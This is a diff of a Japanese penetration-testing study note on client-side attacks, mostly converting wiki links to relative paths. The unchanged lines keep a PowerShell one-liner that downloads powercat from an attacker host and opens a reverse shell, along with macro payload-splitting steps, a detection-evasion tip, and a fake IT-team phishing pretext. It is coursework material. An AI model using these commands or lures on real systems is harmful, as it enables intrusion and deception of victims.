@@ -1,6 +1,6 @@
 - 関連ノート
-	- [[Module 11：Phishing]]
-	- [[2. WeaponizationとDelivery]]
+	- [Module 11：Phishing](Module%2011：Phishing.md)
+	- [2. WeaponizationとDelivery](../TryHackME/Red%20Teaming/2.%20Initial%20Access/2.%20WeaponizationとDelivery.md)
 
 ---
 ---
@@ -51,7 +51,7 @@
 	　→ 監視回避、痕跡を残さない
 
 方法：
-1. [[OSINT#Google hacking]]を使い、ファイルを列挙する
+1. [OSINT](../Cheatsheet/Common/OSINT.md#Google%20hacking)を使い、ファイルを列挙する
 	- （Gobusterでもファイルを列挙できるが、痕跡が残る）
 2. ファイルをExiftoolで解析する
 
@@ -70,7 +70,7 @@ exiftool -a -u [ファイル]
 - メタデータの編集：画像ファイルのExif情報を変更したり、新しいメタデータを追加したりできる。例えば、撮影日時の修正や作者名の追加などが可能
 - メタデータの削除：不要なExif情報を削除することができる。個人情報や位置情報などのプライバシーに関わるデータを削除する場合に使用されることがある
 
-- 関連ノート：[[⚡️File upload vuln#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践]]
+- 関連ノート：[⚡️File upload vuln](../../BSCP/Server-side/File%20upload%20vuln/⚡️File%20upload%20vuln.md#Exiftoolによるpolyglot作成によるコンテンツ検証の回避実践)
 
 ####  出力の着眼点
 
@@ -196,10 +196,10 @@ LibreOfficeの場合のマクロ設定方法は、[Proving Grounds Practice writ
 
 ### 用語・前提知識
 
-- [[用語#マクロに関する前提知識]]
-- [[用語#ActiveXオブジェクト]]
-- [[用語#Windows Script Host(WSH)]]
-- [[用語#WScript・CScript]]
+- [用語](../Misc/用語.md#マクロに関する前提知識)
+- [用語](../Misc/用語.md#ActiveXオブジェクト)
+- [用語](../Misc/用語.md#Windows%20Script%20Host(WSH))
+- [用語](../Misc/用語.md#WScript・CScript)
 
 マクロはClient-Side Attackの攻撃ベクターとして2025年現在も有効
 	（[DDE](https://learn.microsoft.com/en-us/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN)や[OLE](https://en.wikipedia.org/wiki/Object_Linking_and_Embedding)は現在はほぼ使えない）
@@ -247,7 +247,7 @@ Sub MyMacro()
 
 End Sub
 ```
-- `CreateObject`：[[用語#VBScript]]
+- `CreateObject`：[用語](../Misc/用語.md#VBScript)
 
 3. Officeマクロは標準では自動実行されないので、ファイルが開かれたタイミングでマクロが自動的に実行されるようにする
 ```vb
@@ -305,7 +305,7 @@ IEX (New-Object Net.Webclient).downloadstring('http://[AttackerIP]/powercat.ps1'
 ```
 
 3. 特殊文字による実行失敗を防ぐため、Base64エンコードする。
-	[[忘れがちなコマンド(Linux・Windows)#PowerShellワンライナーのBase64エンコード化]]
+	[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#PowerShellワンライナーのBase64エンコード化)
 
 4. Base64エンコードした文字列を50文字ずつに分割し、`Str = Str + "[分割後のbase64文字列]"`の形式で出力するPythonスクリプトを実行
 ```python
@@ -319,7 +319,7 @@ for i in range(0, len(str), n):
 - `n = 50`：VBAは255文字の制限ではあるが環境差異を考慮した値。なんでもいいが、100でもうまくいく可能性はある。
 - `range(0, len(str), n)`：0から str の長さまで、n（例: 50）文字単位で繰り返す
 - `str[i:i+n]`：文字列 str の i から i+n の範囲を切り出す（部分文字列）
-![[Pasted image 20250517181019.png | ]]
+[](../画像ファイル/Pasted%20image%2020250517181019.png)
 $$Pythonスクリプト実行結果$$
 
 5. マクロ編集画面で文字列型の変数を宣言し、Base64エンコードして分割した文字列を変数で連結していく
@@ -387,7 +387,7 @@ End Sub
 - 直接メールで配信すると遮断されやすいので、Windows Library Filesを使用する
 - ファイル形式：`.lnk`
 - 補足：バックドアとして使われることもある
-	- [[3. Windows Local Persistence#ショートカットファイル（lnk）のバックドア化]]
+	- [3. Windows Local Persistence](../TryHackME/Red%20Teaming/3.%20Post%20Compromise/3.%20Windows%20Local%20Persistence.md#ショートカットファイル（lnk）のバックドア化)
 
 ---
 
@@ -463,7 +463,7 @@ $$WebDavサーバ構築成功時の出力$$
 $$空白Windowsライブラリファイル$$
 
 5. `config.library-ms`ファイルにXMLで記述し、保存
-	- ：[[#補足：XMLコードの解説]]
+	- ：[Module 12：Client-side Attacks](Module%2012：Client-side%20Attacks.md#補足：XMLコードの解説)
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
@@ -511,9 +511,9 @@ $$実行後のライブラリファイルの中身が変わっている$$
 ...
 </libraryDescription>
 ```
-- xmlns（xml name space)：XMLにおける名前空間（[[📕#名前空間]]）
+- xmlns（xml name space)：XMLにおける名前空間（[📕](../../BSCP/Misc/📕.md#名前空間)）
 - `http://schemas.microsoft.com/windows/2009/librarye`：Microsoftのライブラリスキーマに属することを明示する
-- [[用語#xmlnsにおけるリンク]]
+- [用語](../Misc/用語.md#xmlnsにおけるリンク)
 
 2. 「ドキュメント」のローカライズリソース（文字列・UI要素）などを参照する
 ```xml
@@ -524,9 +524,9 @@ $$実行後のライブラリファイルの中身が変わっている$$
 	- 他にも`shell32.dll`が使えるが、"shell"というワードがセキュリティ製品に検知されるかもしれないので使用を避ける
 - `-34582`：ドキュメントのリソースID（ピクチャは`-34595`)
 	- ※リソースIDは[Resource Hacker](https://forest.watch.impress.co.jp/article/2001/01/29/okiniiri.html)などのツールを使う方法があるが、生成AIに聞く方が楽
-- [[#補足：リソースID(`@windows.storage.dll,-34582`)について]]
+- [Module 12：Client-side Attacks](Module%2012：Client-side%20Attacks.md#補足：リソースID(`@windows.storage.dll,-34582`)について)
 - `<version>`：任意の数値
-- [[用語#DLL(Dynamic link library)]]
+- [用語](../Misc/用語.md#DLL(Dynamic%20link%20library))
 
 3. ライブラリファイルの見た目を整備する
 ```xml
@@ -592,7 +592,7 @@ $$実行後のライブラリファイルの中身が変わっている$$
 ```powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[AttackerIP]:[Port]/powercat.ps1');powercat -c [AttackerIP] -p [ListenerPort] -e powershell"
 ```
-- 参考：[[忘れがちなコマンド(Linux・Windows)#PowerShellワンライナーのBase64エンコード化]]
+- 参考：[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#PowerShellワンライナーのBase64エンコード化)
 ![[Pasted image 20250519074203.png]]
 $$ショートカット作成中の画面$$
 #### 💡Tips：ショートカットファイルを無害に見せる方法
@@ -624,11 +624,11 @@ sudo python -m http.server <Port>
 ### 🔹 第5段階：配布と実行
 
 12. Windowsマシン上で作成したショートカット(.lnk)を、攻撃者マシンの`webdav`ディレクトリに配置する
-	- [[ファイル操作、ユーティリティ#scp]]
+	- [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#scp)
 
-13. （スキップ可）kali上で`test.txt`があれば削除し、ライブラリファイルが変更されていたら再度クリーンにする：[[#🚨注意：実行後はコードが変わるので要編集]]
+13. （スキップ可）kali上で`test.txt`があれば削除し、ライブラリファイルが変更されていたら再度クリーンにする：[Module 12：Client-side Attacks](Module%2012：Client-side%20Attacks.md#🚨注意：実行後はコードが変わるので要編集)
 
-14. Pretext（口実）を用いて、メールなどで「ライブラリファイル」(.library-ms)を送付（[[Module 11：Phishing#補足：メールの送信方法]]）
+14. Pretext（口実）を用いて、メールなどで「ライブラリファイル」(.library-ms)を送付（[Module 11：Phishing](Module%2011：Phishing.md#補足：メールの送信方法)）
     メッセージ例：
 ```
 件名：設定ファイルの実行のお願い（ITチームより）
@@ -652,7 +652,7 @@ sudo python -m http.server <Port>
 
 #### 補足：.lnkへMotWが付与されてしまう
 
-- ライブラリファイル上でショートカット(.lnk)を実行すると、MotWが付与され、攻撃が阻害される可能性がある：[[#MotWとは]]
+- ライブラリファイル上でショートカット(.lnk)を実行すると、MotWが付与され、攻撃が阻害される可能性がある：[Module 12：Client-side Attacks](Module%2012：Client-side%20Attacks.md#MotWとは)
 ![[Pasted image 20250520075229.png]]
 $$.lnk実行時の警告ポップアップ$$
 
